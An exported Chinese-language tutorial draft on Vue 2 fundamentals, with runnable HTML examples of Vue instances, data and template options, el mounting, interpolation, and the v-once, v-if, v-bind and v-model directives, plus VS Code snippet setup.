---
title: "vue2"
slug: "vue-vue2-vue2-a0e09fcf-revision-20260730"
summary: ""
category: "vue2"
tags: []
status: "draft"
sortOrder: 230
cover: ""
originalId: "6a2d291e8a2b1c68f2cac29e"
originalSlug: "vue-vue2-vue2-a0e09fcf"
originalStatus: "published"
exportedAt: "2026-07-30T13:20:22.058Z"
---
# 一、 Vue程序初体验 
先不去了解Vue框架的发展历史，Vue框架的特点，Vue的作者，这些对于我们开发来说，没有什么特别的作用，我们先学会基本使用，然后再去详细了解它的特点，就会发现，原来如此。

但我们需要指导<font style="color:#F33232;">Vue是一个基于JavaScript（JS）实现的框架</font>，想要使用它，就得先拿到Vue的js文件

Vue官网

Vue2：[https://v2.cn.vuejs.org/](https://v2.cn.vuejs.org/" \t "_blank)

Vue3：[https://cn.vuejs.org/](https://cn.vuejs.org/" \t "_blank)

目前最新的是Vue3，企业也大量使用到，但Vue3在Vue2的基础上，先学习Vue2，Vue3学习会事半功倍，且企业也有大量的Vue2项目需要进行维护，所以Vue2必须要掌握

## 1.1 下载并安装vue.js 
第一步：打开Vue2官网，点击下图所示的“起步”：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433642025-15520923-f271-41eb-9475-ebb858596bb1.png)

第二步：继续点击下图所示的“安装”

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433642266-61b9a42b-36a7-44eb-b664-8ec45504dabc.png)

第三步：在“安装”页面向下滚动，直到看到下图所示位置：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433642506-2461e0a3-1169-494b-b845-17a667832c93.png)

第四步：点击开发版本，并下载

第五步：安装Vue

使用script标签引入vue.js文件。就像这样：

<font style="color:#595959;"><script src=”xx/vue.js”></script></font>

## 1.2 、第一个Vue程序 
### 1.2.1、先创建Vue第一个程序
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;"><head></font>

<font style="color:#595959;">    <meta charset="UTF-8"></font>

<font style="color:#595959;">    <title>第一个Vue程序</title></font>

<font style="color:#595959;">    <!-- 第一步：引入Vue.js --></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;"></head></font>

<font style="color:#595959;"><body></font>

<font style="color:#595959;">    <!-- 第二步：指定挂载位置 --></font>

<font style="color:#595959;">    <div id="app"></div></font>

<font style="color:#595959;">    <!-- 第三步：使用Vue --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">        // 3.1创建Vue实例</font>

<font style="color:#595959;">        const vm=new Vue({</font>

<font style="color:#595959;">            template:'<h1>hello world!</h1>'</font>

<font style="color:#595959;">        })</font>

<font style="color:#595959;">        // 3.2 将Vue实例挂载到指定位置</font>

<font style="color:#595959;">        vm.$mount('#app')</font>

<font style="color:#595959;">       // vm.$mount(document.getElementById("app"));</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;"></body></font>

<font style="color:#595959;"></html></font>

### 1.2.2、解释说明：
1、当使用script引入Vue.js之后，Vue会被注册为一个全局变量，就像引入jQuery之后，jQuery也会被注册为一个全局变量,通过控制台可以看到这个Vue全局变量

2、必须new一个Vue实例，如果不new的话，是无法直接使用Vue的

第一步：创建一个空对象，作为将要返回的对象。 let vm = {}

第二步：将这个空对象的原型指向构造函数的prototype属性，也就是将对象的__proto__属性指向构造函数的prototype。

【让对象能沿着原型链去使用构造函数中prototype上的方法】 vm.__proto__ = Vue.prototype

第三步：将这个空对象赋值给构造函数内部的this关键字，执行构造函数。【让构造器中设置的属性和方法设置在这个对象上】

Vue.apply(vm, 参数)

第四步：返回这个对象。 return vm

3、Vue的构造方法参数是一个options配置对象，配置对象中有大量Vue预定义的配置，每一个配置项都是key：value结构，一个key：value就是一个Vue的配置项

4、template配置项：value是一个模版字符串，在这里编写符合Vue语法规则的代码（Vue有一套自己规定的语法规则）

写在这里的字符串会被Vue编译器编译，将其转换为浏览器能够识别的HTML代码，template称之为模版

5、Vue实例的$mount方法，这个方法完成挂载工作，将Vue实例挂载到指定位置，也就是将Vue编译后的HTML代码<font style="color:#F33232;">渲染</font>到页面指定的位置，注意：指定位置的元素会被<font style="color:#F33232;">替换</font>

<font style="color:#000000;">6、‘#app’的语法类似于css中的id选择器语法，表示将Vue实例挂载到id=‘app’的元素位置，也可以用其他选择器，如果匹配到多个位置，Vue只会选择第一个位置进行挂载（从上到下第一个），或者直接用原声js去获取：</font>vm.$mount(document.getElementById("app"));

## 1.3 、Vue的data配置项 
如果仅仅像我们以上书写的程序，我们完全没有必要使用Vue，直接在body里直接书写就可以了：

在Vue中还有一个data的配置项，它可以帮助我们动态的渲染页面：

### 1.3.1、代码如下
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>模板语句的数据来源</title></font>

<font style="color:#595959;">    <!-- 引入Vue --></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 指定挂载位置 --></font>

<font style="color:#595959;">    <div id="app"></div></font>

<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        // template: `<h1>我叫张三，我今年18岁了</h1>`,</font>

<font style="color:#595959;">        template: `<h1>我叫{{name}},我今年{{age}}岁了</h1>`,</font>

<font style="color:#595959;">        //1.1 data函数写法</font>

<font style="color:#595959;">        // data: function () {</font>

<font style="color:#595959;">        //   return {</font>

<font style="color:#595959;">        //     name: "章三",</font>

<font style="color:#595959;">        //     age: 28,</font>

<font style="color:#595959;">        //   };</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">        //1.2 data函数简写</font>

<font style="color:#595959;">        // data() {</font>

<font style="color:#595959;">        //   return {</font>

<font style="color:#595959;">        //     name: "章三",</font>

<font style="color:#595959;">        //     age: 28,</font>

<font style="color:#595959;">        //   };</font>

<font style="color:#595959;">        // },</font>

<font style="color:#595959;">        // 2、data对象写法</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          name: "李四",</font>

<font style="color:#595959;">          age: 18,</font>

<font style="color:#595959;">          hobby: ["跑步", "游泳", "学习"],</font>

<font style="color:#595959;">          salary: {</font>

<font style="color:#595959;">            base: "5k",</font>

<font style="color:#595959;">            bonus: {</font>

<font style="color:#595959;">              month: "5k",</font>

<font style="color:#595959;">              year: "10k",</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      }).$mount("#app");</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

### 1.3.2、代码解释
1、data是Vue实例的数据对象，是给整个Vue实例提供数据来源的

2、data配置项的value值，有两种写法 Object｜Function（对象或者函数），现阶段，这两种写法都可以，后期学到组件化的时候，data只能是函数的写法，建议大家直接用函数

3、如果data是对象的写法，对象必须是存粹的对象（含有0个或多个key：value）

4、data数据插入到模版语句中，可以用{{}},这是Vue框架自己搞的一个语法，叫插值语法（或叫胡子语法），可以从data根据key获取value，并且将value插入到对应的位置，注意{{}}语法是固定语法，不可以添加其他内容，例如空格{ { }}

5、data可以写多级，然后去一级一级获取

6、Vue编译器对template进行编译，遇到{{}}语法时，就去data里取数据，然后将获取到的数据插入到对应的位置，生成对应的html代码，最终将html渲染到挂载位置，呈现

7、当data发生改变时，template模版就会被重新编译，重新渲染

### 1.4、 Vue的template配置项 
### 1.4.1、具体代码
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>template配置项详解</title></font>

<font style="color:#595959;">    <!-- 引入Vue --></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 指定挂载位置 --></font>

<font style="color:#595959;">    <!-- 注意：以下代码是Vue框架能看懂的代码了。</font>

<font style="color:#595959;">        下面的代码就是一个模板语句。这个代码是需要Vue框架编译，然后渲染的。 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <!-- <div></font>

<font style="color:#595959;">        <h1>{{msg}}</h1></font>

<font style="color:#595959;">        <h1>{{name}}</h1></font>

<font style="color:#595959;">      </div> --></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        // 错误的</font>

<font style="color:#595959;">        //template : '<h1>{{msg}}</h1><h1>张三</h1>',</font>

<font style="color:#595959;">        template: `</font>

<font style="color:#595959;">            <div></font>

<font style="color:#595959;">                <h1>{{msg}}</h1></font>

<font style="color:#595959;">                <h1>{{name}}</h1></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">            `,</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello World!!!!!!!",</font>

<font style="color:#595959;">          name: "张三",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      }).$mount("#app");</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

### <font style="color:#000000;">1.4.2、代码解释</font>
<font style="color:#000000;">1、template</font><u><font style="color:#000000;">只能有一个根元素</font></u><font style="color:#000000;">，只要data数据发生变化，template就会重新编译</font>

<font style="color:#000000;">2、template编译后进行渲染时会将挂载位置的元素替换。</font>

<font style="color:#000000;">3、template后面的代码如果需要换行的话，建议将代码写到``符号当中，不建议使用 + 进行字符串的拼接。</font>

<font style="color:#000000;">4、template配置项可以省略，将其直接编写到HTMl代码中，此时指定挂载的位置就不会被替换</font>

<font style="color:#000000;">5、只要data中的数据发生了变化，模版语句就一定会重新编译</font>

## 1.5、el配置项
### 1.5.1、具体代码
<font style="color:#595959;"><!DOCTYPE html></font>

<font style="color:#595959;"><html lang="en"></font>

<font style="color:#595959;">  <head></font>

<font style="color:#595959;">    <meta charset="UTF-8" /></font>

<font style="color:#595959;">    <title>el配置项</title></font>

<font style="color:#595959;">    <!-- 引入Vue --></font>

<font style="color:#595959;">    <script src="../js/vue.js"></script></font>

<font style="color:#595959;">  </head></font>

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 指定挂载位置 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <div></font>

<font style="color:#595959;">        <h1>{{msg}}</h1></font>

<font style="color:#595959;">        <h1>{{name}}</h1></font>

<font style="color:#595959;">      </div></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello World!!!!!!!",</font>

<font style="color:#595959;">          name: "张三",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">        // el配置项：确定挂载对象</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        //el : document.getElementById('app')</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">      //}).$mount('#app')</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

<font style="color:#595959;"></html></font>

### 1.5.2 、代码解释
1、可以不使用$mount('#app')的方式进行挂载了。在Vue中有一个配置项：el ，

el配置项和$mount()可以达到同样的效果。

2、el配置项的作用？

el是element单词的缩写，翻译为“元素”，el配置项主要是用来指定Vue实例关联的容器。也就是说Vue所管理的容器是哪个。

el : '#app'，表示让Vue实例去接管id='app'的容器。

## 1.6、解决控制台的提示信息和错误信息
### 1.6.1、去除生产提示
Vue.config<font style="color:#304455;"> 是一个对象，包含 Vue 的全局配置，其中有个属性</font>[productionTip](https://v2.cn.vuejs.org/v2/api/" \l "productionTip" \t "_blank)<font style="color:#304455;">，设置为 </font>

false<font style="color:#304455;"> 以阻止 vue 在启动时生成生产提示。</font>

<font style="color:#595959;">// 有时不生效，可能因为版本问题，彻底解决办法，去源码里修改</font>

<font style="color:#595959;">Vue.config.productionTip = false</font>

### 1.6.2、安装Vue Devtools
第一步：极简插件：[https://chrome.zzzmh.cn/](https://chrome.zzzmh.cn/" \t "_blank)下载

第二步：将下载解压好的crx文件，安装到浏览器中

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433642732-8d60b7fc-3a0f-49d7-918d-e3b1613dbf1e.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433643014-46a33b3b-4df4-44cc-b069-c5c625422b7e.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433643272-6bcb48ed-bcd1-44a9-9b50-1a8a925e6991.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433643564-5a88b616-577e-40ab-9242-052f24c97b88.png)

注意，数据如果是纯中文，可能是显示不出来对应组件的数据区域的

## 1.7、Vue实例和容器一一对应
<u>一个Vue实例只能接管一个容器</u>。一旦接管到容器之后， 即使后面有相同的容器，Vue也是不管的。因为Vue实例已经“娶到媳妇”了。

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 准备容器 --></font>

<font style="color:#595959;">    <div class="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <div class="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <!-- 准备容器 --></font>

<font style="color:#595959;">    <div id="app2"></font>

<font style="color:#595959;">      <h1>{{name}}</h1></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      /* </font>

<font style="color:#595959;">     验证：一个Vue实例可以接管多个容器吗？</font>

<font style="color:#595959;">不能。一个Vue实例只能接管一个容器。一旦接管到容器之后，</font>

<font style="color:#595959;">    即使后面有相同的容器，Vue也是不管的。因为Vue实例已经“娶到媳妇”了。</font>

<font style="color:#595959;">        */</font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        el: ".app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello Vue!",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>



<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        el: "#app2",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          name: "zhangsan",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">     new Vue({</font>

<font style="color:#595959;">            el: "#app2",</font>

<font style="color:#595959;">            data: {</font>

<font style="color:#595959;">              name: "lisi",</font>

<font style="color:#595959;">            },</font>

<font style="color:#595959;">          });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 《2.1、模版语法》
### 2.1.1、插值语法
#### 1、代码示例
<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 准备容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <!-- 在data中声明的 --></font>

<font style="color:#595959;">      <!--1、 data中声明的变量 --></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <h1>{{sayHello()}}</h1></font>

<font style="color:#595959;">      <!-- 不在data中的变量不可以 --></font>

<font style="color:#595959;">      <!-- <h1>{{i}}</h1> --></font>

<font style="color:#595959;">      <!-- <h1>{{sum()}}</h1> --></font>



<font style="color:#595959;">      <!-- 2、常量 --></font>

<font style="color:#595959;">      <h1>{{100}}</h1></font>

<font style="color:#595959;">      <h1>{{'hello vue!'}}</h1></font>

<font style="color:#595959;">      <h1>{{3.14}}</h1></font>



<font style="color:#595959;">      <!--3、 javascript表达式 --></font>

<font style="color:#595959;">      <h1>{{1 + 1}}</h1></font>

<font style="color:#595959;">      <h1>{{msg + 1}}</h1></font>

<font style="color:#595959;">      <h1>{{'msg' + 1}}</h1></font>

<font style="color:#595959;">      <h1>{{gender ? '男' : '女'}}</h1></font>

<font style="color:#595959;">      <h1>{{number + 1}}</h1></font>

<font style="color:#595959;">      <h1>{{msg.split('').reverse().join('')}}</h1></font>



<font style="color:#595959;">      <!-- 错误的：不是表达式，这是语句。 --></font>

<font style="color:#595959;">      <!-- <h1>{{var i = 100}}</h1> --></font>



<font style="color:#595959;">      <!-- 4、在白名单里面的 --></font>

<font style="color:#595959;">      <h1>{{Date}}</h1></font>

<font style="color:#595959;">      <h1>{{Date.now()}}</h1></font>

<font style="color:#595959;">      <h1>{{Math}}</h1></font>

<font style="color:#595959;">      <h1>{{Math.ceil(3.14)}}</h1></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      // 用户自定义的一个全局变量</font>

<font style="color:#595959;">      var i = 100;</font>

<font style="color:#595959;">      // 用户自定义的一个全局函数</font>

<font style="color:#595959;">      function sum() {</font>

<font style="color:#595959;">        console.log("sum.....");</font>

<font style="color:#595959;">      }</font>



<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          number: 1,</font>

<font style="color:#595959;">          gender: true,</font>

<font style="color:#595959;">          msg: "abcdef", // msg是在data中声明的变量</font>

<font style="color:#595959;">          sayHello: function () {</font>

<font style="color:#595959;">            console.log("hello vue!");</font>

<font style="color:#595959;">          },</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

#### 2、代码总结
{{可以写什么}}

1. **<font style="color:#FF0000;">data</font>**<font style="color:#000000;">中声明的变量，函数，数组，等都可以</font>
2. **<font style="color:#FF0000;">常量</font>**
3. <font style="color:#000000;">只要是</font>**<font style="color:#FF0000;">合法</font>**<font style="color:#000000;">的javascript</font>**<font style="color:#FF0000;">表达式</font>**<font style="color:#000000;">都可以，注意js语句不行，赋值语句，if，for等</font>
4. **<font style="color:#FF0000;">模版表达式</font>**<font style="color:#000000;">都被放在沙盒中，只能访问全局变量的一个白名单，如：Math和Date</font>

'Infinity,undefined,NaN,isFinite,isNaN,' 

'parseFloat,parseInt,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,' 

'Math,Number,Date,Array,Object,Boolean,String,RegExp,Map,Set,JSON,Intl,' 

'require'

### 2.1.2、指令语法
1. 什么是指令？有什么作用？

<u>指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM</u>

2. Vue框架中的所有指令的名字都以“**<font style="color:#FF0000;">v-</font>**”开始。

3. 插值是写在标签体当中的，那么指令写在哪里呢？

Vue框架中所有的<u>指令都是以HTML标签的</u>**<u>属性形式</u>**<u>存在的</u>，

例如：<span 指令是写在这里的>{{这里是插值语法的位置}}</span>

注意：虽然指令是写在标签的属性位置上，但是这个指令浏览器是无法直接看懂的。是需要先让Vue框架进行编译的，编译之后的内容浏览器是可以看懂的。

4. 指令的语法规则：

完整的语法格式：

**<font style="color:#FF0000;"><HTML标签 v-指令名:参数="javascript表达式"></HTML标签></font>**

javascript表达式：

之前在插值语法中{{这里可以写什么}}，那么指令中的表达式就可以写什么，当然{{}}不需要写

不是所有的指令都有参数和表达式：

有的指令，不需要参数，也不需要表达式，例如：v-once

有的指令，不需要参数，但是需要表达式，例如：v-if="表达式"

有的指令，既需要参数，又需要表达式，例如：v-bind:参数="表达式"

**5. v-once 指令**

作用：**<font style="color:#FF0000;">只渲染元素一次</font>**。随后的重新渲染，元素及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能。 

**6. v-if="表达式" 指令**

作用：表达式的执行结果需要是一个布尔类型的数据：true或者false

true：这个指令所在的标签，**<u>会被渲染</u>**到浏览器当中。

false：这个指令所在的标签，**<u>不会被渲染</u>**到浏览器当中。

<font style="color:#595959;"> <body></font>

<font style="color:#595959;">    <!-- 准备一个容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <h1>{{msg}}</h1></font>

<font style="color:#595959;">      <!-- 只会渲染一次，msg更改数据，也不会再次渲染 --></font>

<font style="color:#595959;">      <h1 v-once>{{msg}}</h1></font>

<font style="color:#595959;">      <h1 v-if="a > b">v-if测试：你看我出不出现</h1></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello Vue!",</font>

<font style="color:#595959;">          a: 10,</font>

<font style="color:#595959;">          b: 11,</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.1.3、v-bind指令详解
1. 这个指令是干啥的？

它可以让HTML标签的某个**<u>属性的值产生动态的效果。</u>**



2. v-bind指令的语法格式：

<HTML标签 v-bind:参数="表达式"></HTML标签>



3. v-bind指令的编译原理？

编译前：

<HTML标签 v-bind:参数="表达式"></HTML标签>

编译后：

<HTML标签 参数="表达式的执行结果"></HTML标签>

注意两项：

第一：在编译的时候v-bind后面的“参数名”会被编译为HTML标签的“属性名”

第二：表达式会关联data，当data发生改变之后，表达式的执行结果就会发生变化。所以，连带的就会产生动态效果。



4. v-bind因为很常用，所以Vue框架对该指令提供了一种简写方式：

只是针对v-bind提供了以下简写方式：

<img**<font style="color:#FF0000;"> :</font>**src="imgPath"> 



5. 什么时候使用插值语法？什么时候使用指令？

凡是标签体当中的**<font style="color:#FF0000;">内容</font>**要想动态，需要使用**<font style="color:#FF0000;">插值</font>**语法。

只要向让HTML标签的**<font style="color:#FF0000;">属性</font>**动态，需要使用**<font style="color:#FF0000;">指令</font>**语法。

<font style="color:#595959;">  <body></font>

<font style="color:#595959;">    <!-- 准备一个容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <!-- 注意：以下代码中 msg 是变量名。 --></font>

<font style="color:#595959;">      <!-- 注意：原则上v-bind指令后面的这个参数名可以随便写。 --></font>

<font style="color:#595959;">      <!-- 虽然可以随便写，但大部分情况下，这个参数名还是需要写成该HTML标签支持的属性名。这样才会有意义。 --></font>

<font style="color:#595959;">      <span v-bind:xyz="msg"></span></font>



<font style="color:#595959;">      <!-- 这个表达式带有单引号，这个'msg'就不是变量了，是常量。 --></font>

<font style="color:#595959;">      <span v-bind:xyz="'msg'"></span></font>



<font style="color:#595959;">      <!-- v-bind实战 --></font>

<font style="color:#595959;">      <img src="../img/1.jpg" /> <br /></font>

<font style="color:#595959;">      <img v-bind:src="imgPath" /> <br /></font>



<font style="color:#595959;">      <!-- v-bind简写形式 --></font>

<font style="color:#595959;">      <img :src="imgPath" /> <br /></font>



<font style="color:#595959;">      <!-- 这是一个普通的文本框 --></font>

<font style="color:#595959;">      <input type="text" name="username" value="zhangsan" /> <br /></font>

<font style="color:#595959;">      <!-- 以下文本框可以让value这个数据变成动态的：这个就是典型的动态数据绑定。 --></font>

<font style="color:#595959;">      <input type="text" name="username" :value="username" /> <br /></font>



<font style="color:#595959;">      <!-- 使用v-bind也可以让超链接的地址动态 --></font>

<font style="color:#595959;">      <a href="https://www.baidu.com">百度1</a> <br /></font>

<font style="color:#595959;">      <a :href="url">百度2</a> <br /></font>



<font style="color:#595959;">      <!-- 不能采用以下写法，会报错--></font>

<font style="color:#595959;">      <!-- <a href="{{url}}">百度3</a>  --></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          msg: "Hello Vue!",</font>

<font style="color:#595959;">          imgPath: "../img/1.jpg",</font>

<font style="color:#595959;">          username: "章三",</font>

<font style="color:#595959;">          url: "https://www.baidu.com",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.1.4、 v-model详解
1. v-bind和v-model这两个指令都可以完成数据绑定。

2. **<font style="color:#FF0000;">v-bind是单向数据绑定。</font>**

data ===> 视图

3. **<font style="color:#FF0000;">v-model是双向数据绑定。</font>**

data <===> 视图

4. v-bind可以使用在任何HTML标签当中。

<u>v-model只能使用在表单类元素上</u>，例如：input标签、select标签、textarea标签。

为什么v-model的使用会有这个限制呢？

因为表单类的元素才能给用户提供交互输入的界面。v-model指令通常也是用在value属性上面的。

5. v-bind和v-model都有简写方式：

**<font style="color:#FF0000;">v-bind简写方式：</font>**

**<font style="color:#FF0000;">v-bind:参数="表达式" 简写为 :参数="表达式"</font>**



**<font style="color:#FF0000;">v-model简写方式：</font>**

**<font style="color:#FF0000;">v-model:value="表达式" 简写为 v-model="表达式"</font>**

<font style="color:#595959;"><body></font>

<font style="color:#595959;">    <!-- 准备一个容器 --></font>

<font style="color:#595959;">    <div id="app"></font>

<font style="color:#595959;">      <!-- 完整写法 --></font>

<font style="color:#595959;">      v-bind指令：<input type="text" v-bind:value="name1" /><br /></font>

<font style="color:#595959;">      v-model指令：<input type="text" v-model:value="name2" /><br /></font>



<font style="color:#595959;">      <!-- 报错了，v-model不能使用在这种元素上。 --></font>

<font style="color:#595959;">      <!-- <a v-model:href="url">百度</a> --></font>



<font style="color:#595959;">      <!-- 简写 --></font>

<font style="color:#595959;">      v-bind指令：<input type="text" :value="name1" /><br /></font>

<font style="color:#595959;">      v-model指令：<input type="text" v-model="name2" /><br /></font>



<font style="color:#595959;">       <!-- 联动改变 --></font>

<font style="color:#595959;">      v-bind消息1：<input type="text" :value="msg" /><br /></font>

<font style="color:#595959;">      v-model消息2：<input type="text" v-model="msg" /><br /></font>

<font style="color:#595959;">    </div></font>



<font style="color:#595959;">    <!-- vue程序 --></font>

<font style="color:#595959;">    <script></font>

<font style="color:#595959;">      new Vue({</font>

<font style="color:#595959;">        el: "#app",</font>

<font style="color:#595959;">        data: {</font>

<font style="color:#595959;">          name1: "zhangsan",</font>

<font style="color:#595959;">          name2: "wangwu",</font>

<font style="color:#595959;">          url: "https://www.baidu.com",</font>

<font style="color:#595959;">          msg: "Hello Vue!",</font>

<font style="color:#595959;">        },</font>

<font style="color:#595959;">      });</font>

<font style="color:#595959;">    </script></font>

<font style="color:#595959;">  </body></font>

### 2.15、用户片段
安装插件：JavaScript (ES6) code snippets

为JavaScript、TypeScript、HTML、React和Vue提供了ES6的语法支持。

第一步：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433643856-f5312aa1-b36d-4c12-a2aa-157e5ccd7964.png)

第二步：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433644088-b985a1a4-a45e-4179-a34d-63d1ec386420.png)

第三步：配置片段

html.json中设置html环境下的代码片段

<font style="color:#595959;">// 配置信息</font>

<font style="color:#595959;">"Print to console": {</font>

<font style="color:#595959;">  // 给片段设置的简写</font>

<font style="color:#595959;">  "prefix": "log",</font>

<font style="color:#595959;">  // 配置片段</font>

<font style="color:#595959;">  "body": [</font>

<font style="color:#595959;">    // ,分割开每行代码  $1 鼠标聚焦的地方 </font>

<font style="color:#595959;">  "console.log('$1');",</font>

<font style="color:#595959;">  "$2"</font>

<font style="color:#595959;">  ],</font>

<font style="color:#595959;">  // 片段描述信息（可删除）</font>

<font style="color:#595959;">  "description": "Log output to console"</font>

<font style="color:#595959;">}</font>

具体配置如下：

<font style="color:#595959;">{</font>

<font style="color:#595959;">    "h5 template": {</font>

<font style="color:#595959;">        "prefix": "vv", // 对应的是使用这个模板的快捷键</font>

<font style="color:#595959;">        "body": [</font>

<font style="color:#595959;">            "<!DOCTYPE html>",</font>

<font style="color:#595959;">            "<html lang=\"en\">",</font>

<font style="color:#595959;">            "<head>",</font>

<font style="color:#595959;">            "\t<meta charset=\"UTF-8\">",</font>

<font style="color:#595959;">            "\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">",</font>

<font style="color:#595959;">            "\t<meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">",</font>

<font style="color:#595959;">            "\t<title>Document</title>",</font>

<font style="color:#595959;">            "\t<script src='https://cdn.jsdelivr.net/npm/vue@2.6.10/dist/vue.js'></script>",</font>

<font style="color:#595959;">            "</head>\n",</font>

<font style="color:#595959;">            "<body>",</font>

<font style="color:#595959;">            "\t<div id =\"root\"> </div>\n",</font>

<font style="color:#595959;">            "\t<script>",</font>

<font style="color:#595959;">            "\tVue.config.productionTip = false//阻止vue 在启动时生成生产提示",</font>

<font style="color:#595959;">            "\t var vm = new Vue({",</font>

<font style="color:#595959;">            "\t\tel: '#root',",</font>

<font style="color:#595959;">            "\t\tdata() {return{}},",</font>

<font style="color:#595959;">            "\t\tmethods: {}",</font>

<font style="color:#595959;">            "\t });",</font>

<font style="color:#595959;">            "\t</script>",</font>

<font style="color:#595959;">            "</body>\n",</font>

